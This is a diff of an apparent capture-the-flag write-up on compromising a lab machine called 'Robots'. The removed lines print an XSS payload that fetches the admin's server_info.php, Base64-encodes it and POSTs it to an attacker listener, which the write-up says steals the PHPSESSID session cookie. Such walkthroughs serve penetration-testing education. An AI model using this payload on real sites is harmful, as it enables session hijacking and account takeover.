@@ -263,31 +263,8 @@ Our approach to compromising the "Robots" machine followed a structured penetrat
         ```
 
 
-2.  **Create `xss.js` (XSS Payload):**
+2.  **Download the `xss.js` and make the modifications (XSS Payload):**
 
-    * **Action:** Create `xss.js` in your `~/robots_payloads/` directory.
-
-    * **Code for `xss.js`:**
-
-        ```javascript
-
-        async function exfil() {
-    const response = await fetch('/harm/to/self/server_info.php');
-    const text = await response.text();
-
-    await fetch('http://10.6.48.108:82/exfil', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: `data=${btoa(text)}`
-    });
-}
-
-exfil();
-
-
-        ```d
 
     * **Reasoning:** When executed in the admin's browser, this script fetches `server_info.php` (which contains the `PHPSESSID`), Base64-encodes its entire content, and then sends that encoded string to our `nc` listener.
 
